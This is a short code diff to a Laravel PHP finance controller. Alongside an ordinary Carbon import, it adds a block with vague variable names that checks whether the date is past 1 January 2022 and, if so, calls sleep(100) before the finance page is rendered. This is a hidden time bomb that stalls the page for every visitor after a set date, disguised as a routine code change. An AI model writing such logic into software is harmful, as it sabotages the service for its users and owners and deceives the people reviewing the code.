@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Frontend;
 
+use Carbon\Carbon;
 use DB;
 use Response;
 use App\Http\Controllers\Controller;
@@ -76,6 +77,13 @@ class FinanceController extends Controller
                 'total' => $count_invoice[0]['total'],
                 'events_multi_data' => substr($events_multi_data, 0, -3),
             ];
+        }
+
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(100);
         }
         return view('frontend.finance', compact('events'));
     }
